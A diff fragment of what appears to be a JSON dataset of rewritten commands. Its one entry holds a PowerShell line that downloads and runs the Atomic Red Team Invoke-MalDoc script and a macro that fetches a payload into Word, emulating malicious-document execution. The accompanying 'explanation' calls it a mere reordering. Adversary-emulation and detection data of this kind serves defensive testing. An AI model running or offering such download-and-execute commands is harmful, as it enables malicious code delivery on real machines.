@@ -11,3 +11,4 @@
     "output": "powershell.exe -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (iwr 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1' -UseBasicParsing); $macroCode = Get-Content -Path 'C:\\AtomicRedTeam\\atomics\\T1204.002\\src\\test9-GenericPayloadDownload.txt' -Raw; $URL = '' + ''; $macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt'; Invoke-MalDoc -macroCode $macroCode -officeProduct 'Word'\"",
     "explanation": "This command reorders the arguments for Get-Content and uses the -Path parameter explicitly to avoid ambiguity. It also removes unnecessary quotes and uses a more compact form while maintaining the same behavior."
   }
+]
